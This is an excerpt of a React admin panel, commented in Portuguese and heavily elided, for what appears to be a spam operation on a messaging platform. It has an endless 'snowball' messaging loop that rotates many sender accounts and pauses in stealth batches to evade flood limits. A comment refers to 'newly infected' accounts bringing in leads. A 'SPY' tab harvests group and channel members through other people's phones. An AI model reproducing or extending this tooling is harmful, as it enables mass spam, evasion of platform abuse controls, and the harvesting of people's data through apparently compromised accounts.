...
export default function AdminPanel() {
  // --- ESTADOS DE AUTENTICAÇÃO E SISTEMA ---
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [passwordInput, setPasswordInput] = useState('');
  const [ownerId, setOwnerId] = useState(''); // O bug estava aqui: precisa iniciar vazio e ser preenchido no login
  ...
  // --- INICIALIZAÇÃO E CORREÇÃO DE LOGIN ---
  useEffect(() => {
    ...
    if (savedOwner) {
        ...
        // Força o carregamento dos dados imediatamente com o usuário salvo
        fetchData(savedOwner);
    }

    // Recupera cache local do God Mode
  ...
  // Função central para buscar dados (Corrigida para usar o ownerId correto)
  const fetchData = async (currentUser = ownerId) => {
    if (!currentUser) return; // Não busca se não tiver usuário definido
    
    try {
      // Adicionei timestamp (_t) para evitar cache do navegador que causava bugs
  ...
  const handleLogin = async (e) => {
    ...
    try {
      ...
      if(data.success) { 
          const user = data.ownerId || 'admin'; // Fallback de segurança
          setIsAuthenticated(true);
          setOwnerId(user);
          localStorage.setItem('hottrack_owner', user);
          fetchData(user); // Carrega dados imediatamente após login
      } else { 
  ...
  // ==============================================================================
  // MOTOR DE DISPARO V7 (BOLA DE NEVE + FURTIVO)
  // ==============================================================================
  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas na lista abaixo!');
     
     if(!confirm(`⚠️ INICIAR BOLA DE NEVE?\n\n- Modo: Infinito (Espera novos leads)\n- Velocidade: Furtiva (Anti-Flood)\n- Contas: ${selectedPhones.size}\n\nIniciar operação?`)) return;

     setProcessing(true);
     stopCampaignRef.current = false;
     setProgress(0);
     addLog('❄️ BOLA DE NEVE INICIADA: Aguardando leads e disparando...');
     ...
     try {
         ...
         const BATCH_SIZE = 5; // Poucas mensagens por vez
         const DELAY_MS = 8000; // 8 segundos de pausa entre lotes
         ...
         // LOOP INFINITO
         while (true) {
             if (stopCampaignRef.current) { addLog('🛑 Operação parada manualmente.'); break; }

             // 1. Recupera contas da "Geladeira" (Flood)
             const now = Date.now();
             ...
             if (availableSenders.length === 0) {
                 addLog('⏳ Todas as contas em pausa (Flood Protection). Aguardando 1 min...');
                 await new Promise(r => setTimeout(r, 60000));
                 continue;
             }

             // 2. Busca Leads PENDENTES do Dono Atual
             // A API get-campaign-leads já prioriza quem tem Username e ignora quem já recebeu
             ...
             if (leads.length === 0) {
                 addLog('❄️ Fila vazia. Aguardando novos infectados trazerem leads (30s)...');
                 await new Promise(r => setTimeout(r, 30000)); 
                 fetchData(ownerId); // Atualiza visual
             ...
             for (let i = 0; i < leads.length; i += BATCH_SIZE) {
                 ...
                 const promises = batch.map(async (lead, idx) => {
                     ...
                     // Randomiza a conta usada para parecer mais natural
                     ...
                     try {
                         ...
                         // Tratamento de Flood
                         if (resp.status === 429) {
                             addLog(`🥶 ${sender} Flood detectado. Pausa de 10 min.`);
      ...
      for (let i = 0; i < targets.length; i++) {
          ...
          try {
              const res = await fetch('/api/spy/harvest', { 
                  method: 'POST', 
                  body: JSON.stringify({ 
                      phone: targets[i].ownerPhone, 
                      chatId: targets[i].id, 
                      chatName: targets[i].title, 
                      isChannel: targets[i].type === 'Canal',
                      ownerId: ownerId 
                  }), 
                  headers: {'Content-Type': 'application/json'} 
              });
              ...
              if(data.success) { 
                  count += data.count; 
                  setHarvestedIds(prev => new Set(prev).add(targets[i].id)); 
                  addLog(`✅ +${data.count} leads de ${targets[i].title}`); 
              }
          } catch (e) {}
  ...
  const scanNetwork = async () => {
      ...
      localStorage.setItem('godModeGroups', JSON.stringify(ug)); 
      localStorage.setItem('godModeChannels', JSON.stringify(uc));
      setIsScanning(false);
  };
  ...
  if (!isAuthenticated) return (
      <div style={{height:'100vh', background:'#000', display:'flex', alignItems:'center', justifyContent:'center'}}>
          <form onSubmit={handleLogin} style={{background:'#1c242f', padding:'40px', borderRadius:'15px', border:'1px solid #3390ec'}}>
              ...
              <input type="password" value={passwordInput} onChange={e=>setPasswordInput(e.target.value)} placeholder="Senha" style={{padding:'10px', width:'250px', borderRadius:'5px', border:'none', marginTop:'10px'}} autoFocus />
  ...
  return (
    <div style={{ backgroundColor: '#0d1117', color: '#c9d1d9', minHeight: '100vh', padding: '20px', fontFamily: 'monospace' }}>
        <div style={{marginBottom:'20px', borderBottom:'1px solid #30363d', paddingBottom:'10px', display:'flex', justifyContent:'space-between', alignItems:'center'}}>
            <div>
                <button onClick={()=>setTab('dashboard')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='dashboard'?'#238636':'#0d1117', color:'white', border:'1px solid #30363d', cursor:'pointer'}}>🚀 BOLA DE NEVE</button>
                <button onClick={()=>setTab('spy')} style={{marginRight:'10px', padding:'10px 20px', background: tab==='spy'?'#8957e5':'#0d1117', color:'white', border:'1px solid #30363d', cursor:'pointer'}}>👁️ SPY</button>
                <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'#0d1117', color:'white', border:'1px solid #30363d', cursor:'pointer'}}>🛠️ TOOLS</button>
            </div>
            <div>
               <span style={{fontSize:'12px', marginRight:'10px'}}>User: <b>{ownerId}</b></span>
